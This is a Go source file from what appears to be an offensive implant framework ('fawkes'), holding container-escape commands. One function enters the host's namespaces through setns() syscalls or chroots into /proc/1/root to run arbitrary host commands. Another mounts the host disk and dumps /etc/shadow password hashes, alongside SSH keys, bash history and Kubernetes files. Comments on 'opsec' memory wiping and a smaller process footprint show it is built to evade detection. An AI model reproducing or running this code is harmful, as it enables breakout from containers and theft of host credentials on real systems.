//go:build linux

package commands

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"

	"golang.org/x/sys/unix"

	"fawkes/pkg/structs"
)

// nsNamespace maps namespace names to their clone flags for setns().
type nsNamespace struct {
	name string
	flag int
}

// hostNamespaces are the Linux namespaces to enter for full host context.
var hostNamespaces = []nsNamespace{
	{"mnt", unix.CLONE_NEWNS},
	{"uts", unix.CLONE_NEWUTS},
	{"ipc", unix.CLONE_NEWIPC},
	{"net", unix.CLONE_NEWNET},
	// PID namespace change only affects children, not current process
	{"pid", unix.CLONE_NEWPID},
}

// escapeNsenter enters the host namespaces to run a command.
// Uses direct setns() syscalls instead of spawning nsenter/chroot binaries,
// reducing the process tree footprint to just /bin/sh.
func escapeNsenter(command string) (string, string) {
	if command == "" {
		return "Required: -command '<host command to run>'", "error"
	}

	// Check if we share PID namespace with host
	selfNS, err := os.Readlink("/proc/self/ns/pid")
	if err != nil {
		return fmt.Sprintf("Cannot read PID namespace: %v", err), "error"
	}
	hostNS, err := os.Readlink("/proc/1/ns/pid")
	if err != nil {
		return fmt.Sprintf("Cannot read host PID namespace: %v", err), "error"
	}
	if selfNS != hostNS {
		return fmt.Sprintf("PID namespaces differ (self=%s, host=%s) — nsenter not available", selfNS, hostNS), "error"
	}

	// Try setns approach first (enters host namespaces directly via syscall)
	output, status := nsenterViaSetns(command)
	if status == "success" {
		return output, status
	}

	// Fallback: use SysProcAttr.Chroot to chroot into /proc/1/root
	// This avoids spawning the chroot binary — Go handles it internally
	if _, err := os.Stat("/proc/1/root"); err == nil {
		ctx, cancel := context.WithTimeout(context.Background(), defaultExecTimeout)
		defer cancel()
		cmd := exec.CommandContext(ctx, "/proc/1/root/bin/sh", "-c", command)
		cmd.SysProcAttr = &syscall.SysProcAttr{
			Chroot: "/proc/1/root",
		}
		cmd.Dir = "/"
		out, err := cmd.CombinedOutput()
		defer structs.ZeroBytes(out) // opsec: clear command output from memory
		if err != nil {
			return fmt.Sprintf("setns failed (%s), chroot fallback also failed: %v\n%s", output, err, string(out)), "error"
		}
		return fmt.Sprintf("[+] Executed via chroot /proc/1/root (syscall, no chroot binary)\n\n--- Output ---\n%s", string(out)), "success"
	}

	return fmt.Sprintf("Both setns and chroot approaches failed: %s", output), "error"
}

// nsenterViaSetns enters host namespaces using direct setns() syscalls and runs
// the command. The goroutine is pinned to its OS thread to ensure namespace
// changes are consistent, and original namespaces are restored afterward.
func nsenterViaSetns(command string) (string, string) {
	// Pin this goroutine to a single OS thread — namespace operations are per-thread
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	// Save original namespace FDs so we can restore after the command
	origFDs := make(map[string]int)
	for _, ns := range hostNamespaces {
		fd, err := unix.Open(fmt.Sprintf("/proc/self/ns/%s", ns.name), unix.O_RDONLY, 0)
		if err == nil {
			origFDs[ns.name] = fd
		}
	}
	defer func() {
		// Restore original namespaces (best-effort — failure here means
		// the thread stays in host namespaces, but LockOSThread prevents
		// that from affecting other goroutines)
		for _, ns := range hostNamespaces {
			if fd, ok := origFDs[ns.name]; ok {
				_ = unix.Setns(fd, ns.flag)
				unix.Close(fd)
			}
		}
	}()

	// Enter host namespaces via setns()
	entered := 0
	for _, ns := range hostNamespaces {
		hostPath := fmt.Sprintf("/proc/1/ns/%s", ns.name)
		fd, err := unix.Open(hostPath, unix.O_RDONLY, 0)
		if err != nil {
			continue
		}
		if err := unix.Setns(fd, ns.flag); err != nil {
			unix.Close(fd)
			continue
		}
		unix.Close(fd)
		entered++
	}

	if entered == 0 {
		return "setns: could not enter any host namespaces", "error"
	}

	// Run command — child process inherits our (now host) namespaces
	ctx, cancel := context.WithTimeout(context.Background(), defaultExecTimeout)
	defer cancel()
	cmd := exec.CommandContext(ctx, "/bin/sh", "-c", command)
	out, err := cmd.CombinedOutput()
	defer structs.ZeroBytes(out) // opsec: clear command output from memory
	if err != nil {
		return fmt.Sprintf("setns succeeded (%d namespaces) but command failed: %v\n%s", entered, err, string(out)), "error"
	}

	return fmt.Sprintf("[+] Executed via setns (%d host namespaces entered, no nsenter binary)\n\n--- Output ---\n%s", entered, string(out)), "success"
}

// escapeMountHost mounts a host block device to access the host filesystem.
func escapeMountHost(devicePath string) (string, string) {
	if devicePath == "" {
		// Auto-detect
		for _, dev := range []string{"/dev/sda1", "/dev/vda1", "/dev/xvda1", "/dev/nvme0n1p1", "/dev/sda", "/dev/vda"} {
			if _, err := os.Stat(dev); err == nil {
				devicePath = dev
				break
			}
		}
		if devicePath == "" {
			return "No host block device found. Specify with -path /dev/sdX", "error"
		}
	}

	mountPoint, err := os.MkdirTemp("", "")
	if err != nil {
		return fmt.Sprintf("Failed to create mount point: %v", err), "error"
	}

	// Mount the device
	if err := syscall.Mount(devicePath, mountPoint, "ext4", syscall.MS_RDONLY, ""); err != nil {
		// Try xfs
		if err := syscall.Mount(devicePath, mountPoint, "xfs", syscall.MS_RDONLY, ""); err != nil {
			os.Remove(mountPoint)
			return fmt.Sprintf("Failed to mount %s: %v (need CAP_SYS_ADMIN)", devicePath, err), "error"
		}
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[+] Mounted %s at %s (read-only)\n\n", devicePath, mountPoint))

	// List interesting files
	interesting := []string{
		"/etc/shadow",
		"/etc/passwd",
		"/root/.ssh/authorized_keys",
		"/root/.bash_history",
		"/etc/kubernetes",
	}

	sb.WriteString("--- Host filesystem contents ---\n")
	for _, path := range interesting {
		fullPath := filepath.Join(mountPoint, path)
		if info, err := os.Stat(fullPath); err == nil {
			sb.WriteString(fmt.Sprintf("  [FOUND] %s (%d bytes)\n", path, info.Size()))
		}
	}

	// Read /etc/shadow if possible
	shadowPath := filepath.Join(mountPoint, "etc/shadow")
	if data, err := os.ReadFile(shadowPath); err == nil {
		defer structs.ZeroBytes(data) // opsec: clear password hashes from memory
		lines := strings.Split(string(data), "\n")
		sb.WriteString(fmt.Sprintf("\n--- /etc/shadow (%d entries) ---\n", len(lines)))
		for _, line := range lines {
			if line != "" {
				sb.WriteString(line + "\n")
			}
		}
	}

	sb.WriteString(fmt.Sprintf("\n[*] Host filesystem mounted at %s — use cat/ls to explore\n", mountPoint))
	sb.WriteString("[*] Remember to clean up: unmount when done\n")

	return sb.String(), "success"
}
